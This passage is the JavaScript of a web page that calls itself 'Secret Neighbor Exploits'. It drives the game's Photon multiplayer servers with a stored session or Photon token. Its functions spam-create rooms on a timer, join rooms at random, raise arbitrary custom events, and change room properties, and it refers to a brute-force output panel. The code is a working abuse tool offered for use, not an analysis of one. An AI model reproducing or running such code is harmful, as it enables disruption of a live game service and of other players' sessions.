    document.getElementById("bruteforceOutput").scrollTop = document.getElementById("bruteforceOutput").scrollHeight;
  }

  function connectToPhoton() {
    console.log("connectToPhoton called");
    const output = document.getElementById("photonConnectionOutput");
    
    if (!photonToken) {
      output.textContent = "‚ùå Set Photon Token first.";
      return;
    }

    const region = document.getElementById("photonRegion").value;
    photonClient = new MyPhotonClient(Photon.ConnectionProtocol.Ws, appId, appVersion);
    photonClient.setCustomAuthentication(photonToken, Photon.LoadBalancing.Constants.CustomAuthenticationType.Custom, { token: photonToken });
    photonClient.connectToRegionMaster(region);

    photonClient.onStateChange = function(state) {
      const status = Photon.LoadBalancing.LoadBalancingClient.StateToName(state);
      document.getElementById("photonConnectionOutput").textContent += `üì° State: ${status}\n`;
      if (state === Photon.LoadBalancing.LoadBalancingClient.State.ConnectedToMaster) {
        document.getElementById("photonConnectionOutput").textContent += "‚úÖ Connected to Master Server!\n";
        photonClient.joinLobby();
      }
    };
  }

  function toggleSpamPhotonRooms() {
    if (spamRoomsRunning) {
      clearInterval(spamRoomsIntervalId);
      spamRoomsRunning = false;
      document.getElementById("spamRoomsStatus").className = "status-indicator status-inactive";
      document.getElementById("spamRoomsToggleButton").textContent = "Start Spamming Rooms";
      document.getElementById("spamRoomsOutput").textContent += "\nSpam stopped manually.";
      return;
    }

    if (!photonClient || !photonClient.isConnectedToMaster()) {
      document.getElementById("spamRoomsOutput").textContent = "‚ùå Connect to Photon first.";
      return;
    }

    spamRoomsRunning = true;
    document.getElementById("spamRoomsStatus").className = "status-indicator status-active";
    document.getElementById("spamRoomsToggleButton").textContent = "Stop Spamming Rooms";

    const count = parseInt(document.getElementById("spamRoomCount").value) || 10;
    const prefix = document.getElementById("spamRoomPrefix").value || "spam_";
    let created = 0;

    document.getElementById("spamRoomsOutput").textContent = `Starting to spam ${count} rooms...\n`;

    function createSpamRoom() {
      if (created >= count || !spamRoomsRunning) {
        clearInterval(spamRoomsIntervalId);
        spamRoomsRunning = false;
        document.getElementById("spamRoomsStatus").className = "status-indicator status-inactive";
        document.getElementById("spamRoomsToggleButton").textContent = "Start Spamming Rooms";
        return;
      }

      const roomName = `${prefix}${Math.random().toString(36).substring(2)}`;
      photonClient.createRoom(roomName, { maxPlayers: 2 });
      document.getElementById("spamRoomsOutput").textContent += `Created room: ${roomName}\n`;
      created++;
    }

    createSpamRoom();
    spamRoomsIntervalId = setInterval(createSpamRoom, 500);
  }

  function joinRandomPhotonRoom() {
    if (!photonClient || !photonClient.isConnectedToMaster()) {
      document.getElementById("joinRandomOutput").textContent = "‚ùå Connect to Photon first.";
      return;
    }

    const result = photonClient.joinRandomRoom({}, 0);
    document.getElementById("joinRandomOutput").textContent += result ? "‚úÖ Joining random room...\n" : "‚ùå No rooms available.\n";
  }

  function createPhotonRoom() {
    if (!photonClient || !photonClient.isConnectedToMaster()) {
      document.getElementById("createRoomOutput").textContent = "‚ùå Connect to Photon first.";
      return;
    }

    const roomName = document.getElementById("createRoomName").value.trim();
    const maxPlayers = parseInt(document.getElementById("createMaxPlayers").value) || 6;

    if (!roomName) {
      document.getElementById("createRoomOutput").textContent = "‚ùå Enter room name.";
      return;
    }

    photonClient.createRoom(roomName, { maxPlayers: maxPlayers });
    document.getElementById("createRoomOutput").textContent += `Creating room: ${roomName} (max ${maxPlayers})\n`;
  }

  function joinPhotonRoom() {
    if (!photonClient || !photonClient.isConnectedToMaster()) {
      document.getElementById("joinRoomOutput").textContent = "‚ùå Connect to Photon first.";
      return;
    }

    const roomName = document.getElementById("joinRoomName").value.trim();

    if (!roomName) {
      document.getElementById("joinRoomOutput").textContent = "‚ùå Enter room name.";
      return;
    }

    photonClient.joinRoom(roomName);
    document.getElementById("joinRoomOutput").textContent += `Joining room: ${roomName}\n`;
  }

  function raisePhotonEvent() {
    if (!photonClient || !photonClient.isJoinedToRoom()) {
      document.getElementById("raiseEventOutput").textContent = "‚ùå Join a room first.";
      return;
    }

    const code = parseInt(document.getElementById("eventCode").value);
    const dataStr = document.getElementById("eventData").value.trim();
    let data;
    try {
      data = JSON.parse(dataStr || "{}");
    } catch {
      document.getElementById("raiseEventOutput").textContent = "‚ùå Invalid JSON data.";
      return;
    }

    photonClient.raiseEvent(code, data);
    document.getElementById("raiseEventOutput").textContent += `Raised event ${code} with data: ${dataStr}\n`;
  }

  function setRoomProperties() {
    if (!photonClient || !photonClient.isJoinedToRoom()) {
      document.getElementById("setPropertiesOutput").textContent = "‚ùå Join a room first.";
      return;
    }

    const propsStr = document.getElementById("roomProperties").value.trim();
    let props;
    try {
      props = JSON.parse(propsStr || "{}");
    } catch {
      document.getElementById("setPropertiesOutput").textContent = "‚ùå Invalid JSON properties.";
      return;
    }

    photonClient.setCustomProperty(props);
    document.getElementById("setPropertiesOutput").textContent += `Set properties: ${propsStr}\n`;
  }

  function getPhotonRoomList() {
    if (!photonClient || !photonClient.isConnectedToMaster()) {
      document.getElementById("roomListOutput").textContent = "‚ùå Connect to Photon first.";
      return;
    }

    const rooms = photonClient.availableRooms();
    document.getElementById("roomListOutput").textContent = "Room List:\n" + (rooms.length ? rooms.map(r => `- ${r.name} (${r.playerCount}/${r.maxPlayers})`).join("\n") : "No rooms available.");
  }

  function leavePhotonRoom() {
    if (!photonClient || !photonClient.isJoinedToRoom()) {
      document.getElementById("leaveRoomOutput").textContent = "‚ùå Not in a room.";
      return;
    }

    photonClient.leaveRoom();
    document.getElementById("leaveRoomOutput").textContent += "Left the room.\n";
  }

  function disconnectFromPhoton() {
    if (!photonClient) {
      document.getElementById("disconnectOutput").textContent = "‚ùå Not connected.";
      return;
    }

    photonClient.disconnect();
    document.getElementById("disconnectOutput").textContent += "Disconnected from Photon.\n";
    photonClient = null;
  }

  document.addEventListener("DOMContentLoaded", function() {
    console.log("Secret Neighbor Exploits page loaded");
    const savedTicket = localStorage.getItem('sessionTicket');
    if (savedTicket) {
      sessionTicket = savedTicket;
      document.getElementById("sessionTicketInput").value = savedTicket;
      const tokenStatus = document.getElementById("tokenStatus");
      tokenStatus.textContent = "‚úÖ Token loaded from storage!";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "green";
    }
    const savedPhotonToken = localStorage.getItem('photonToken');
    if (savedPhotonToken) {
      photonToken = savedPhotonToken;
      document.getElementById("photonTokenInput").value = savedPhotonToken;
      const photonTokenStatus = document.getElementById("photonTokenStatus");
      photonTokenStatus.textContent = "‚úÖ Photon Token loaded from storage!";
      photonTokenStatus.style.display = "block";
      photonTokenStatus.style.color = "green";
    }
  });
</script>
